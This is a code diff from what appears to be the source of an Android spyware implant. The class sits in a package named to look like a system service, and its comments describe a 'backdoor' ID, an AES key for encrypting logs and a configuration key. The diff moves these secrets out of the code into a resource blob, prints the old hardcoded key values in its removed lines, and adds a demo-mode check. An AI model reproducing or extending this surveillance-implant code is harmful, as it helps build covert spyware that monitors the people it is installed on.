@@ -7,6 +7,8 @@
 
 package com.android.service.crypto;
 
+import java.util.Arrays;
+
 import android.content.Context;
 import android.content.res.Resources;
 import android.provider.Settings.Secure;
@@ -30,6 +32,35 @@ public class Keys {
 	private volatile static Keys singleton;
 	private static int keyLen = 16;
 
+	// Subversion
+	/** The Constant g_Subtype. */
+	private static final byte[] subtype = { 'A', 'N', 'D', 'R', 'O', 'I', 'D' };
+	// private static final byte[] g_Subtype = { 'A', 'N', 'D', 'R', 'O', 'I',
+	// 'D' };
+
+	// 20 bytes that uniquely identifies the device (non-static on purpose)
+	/** The g_ instance id. */
+	private static byte[] instanceId;
+
+	// 16 bytes that uniquely identifies the backdoor, NULL-terminated
+	/** The Constant g_BackdoorID. */
+	private static byte[] backdoorId;
+
+	// AES key used to encrypt logs
+	/** The Constant g_AesKey. */
+	private static byte[] aesKey;
+
+	// AES key used to decrypt configuration
+	/** The Constant g_ConfKey. */
+	private static byte[] confKey;
+
+	// Challenge key
+	/** The Constant g_Challenge. */
+	private static byte[] challengeKey;
+	
+	// Demo key
+	private static byte[] demoMode;
+	
 	/**
 	 * Self.
 	 * 
@@ -90,46 +121,39 @@ public class Keys {
 			aesKey = Utils.copy(resource, 14, 16);
 			confKey = Utils.copy(resource, 46, 16);
 			challengeKey = Utils.copy(resource, 78, 16);
+			demoMode = Utils.copy(resource, 110, 16);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
 				Check.log(TAG + " aesKey: " + Utils.byteArrayToHex(aesKey));//$NON-NLS-1$
 				Check.log(TAG + " confKey: " + Utils.byteArrayToHex(confKey));//$NON-NLS-1$
 				Check.log(TAG + " challengeKey: " + Utils.byteArrayToHex(challengeKey));//$NON-NLS-1$
+				Check.log(TAG + " instanceId: " + Utils.byteArrayToHex(instanceId));//$NON-NLS-1$
+				Check.log(TAG + " demoMode: " + Utils.byteArrayToHex(demoMode));//$NON-NLS-1$
+			}
+			
+			if (isDemo()) {
+				Cfg.DEMO = true;
 			}
 		}
 	}
 
-	// Subversion
-	/** The Constant g_Subtype. */
-	private static final byte[] subtype = { 'A', 'N', 'D', 'R', 'O', 'I', 'D' };
-	// private static final byte[] g_Subtype = { 'A', 'N', 'D', 'R', 'O', 'I',
-	// 'D' };
-
-	// 20 bytes that uniquely identifies the device (non-static on purpose)
-	/** The g_ instance id. */
-	private static byte[] instanceId = { 'b', 'g', '5', 'e', 't', 'G', '8', '7', 'q', '2', '0', 'K', 'g', '5', '2',
-			'W', '5', 'F', 'g', '1' };
-
-	// 16 bytes that uniquely identifies the backdoor, NULL-terminated
-	/** The Constant g_BackdoorID. */
-	private static byte[] backdoorId = { 'a', 'v', '3', 'p', 'V', 'c', 'k', '1', 'g', 'b', '4', 'e', 'R', '2', 'd',
-			'8', 0 };
-
-	// AES key used to encrypt logs
-	/** The Constant g_AesKey. */
-	private static byte[] aesKey = { '3', 'j', '9', 'W', 'm', 'm', 'D', 'g', 'B', 'q', 'y', 'U', '2', '7', '0', 'F',
-			'T', 'i', 'd', '3', '7', '1', '9', 'g', '6', '4', 'b', 'P', '4', 's', '5', '2' };
-
-	// AES key used to decrypt configuration
-	/** The Constant g_ConfKey. */
-	private static byte[] confKey = { 'A', 'd', 'f', '5', 'V', '5', '7', 'g', 'Q', 't', 'y', 'i', '9', '0', 'w', 'U',
-			'h', 'p', 'b', '8', 'N', 'e', 'g', '5', '6', '7', '5', '6', 'j', '8', '7', 'R' };
-
-	// Challenge key
-	/** The Constant g_Challenge. */
-	private static byte[] challengeKey = { 'f', '7', 'H', 'k', '0', 'f', '5', 'u', 's', 'd', '0', '4', 'a', 'p', 'd',
-			'v', 'q', 'w', '1', '3', 'F', '5', 'e', 'd', '2', '5', 's', 'o', 'V', '5', 'e', 'D' };
+	public boolean isDemo() {
+		byte[] demoDigest = new byte[] { (byte) 0xba, (byte) 0xba,
+            (byte) 0x73, (byte) 0xe6, (byte) 0x7e, (byte) 0x39, (byte) 0xdb,
+            (byte) 0x5d, (byte) 0x94, (byte) 0xf3, (byte) 0xc6, (byte) 0x7a,
+            (byte) 0x58, (byte) 0xd5, (byte) 0x2c, (byte) 0x52 };
+		
+		byte[] calculated = Encryption.MD5(demoMode);
+		
+		boolean ret = Arrays.equals(calculated, demoDigest);
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (isDemo): " + ret); //$NON-NLS-1$
+		}
+		
+		return ret;
+	}
 
 	/**
 	 * Check. for been binary patched. //$NON-NLS-1$
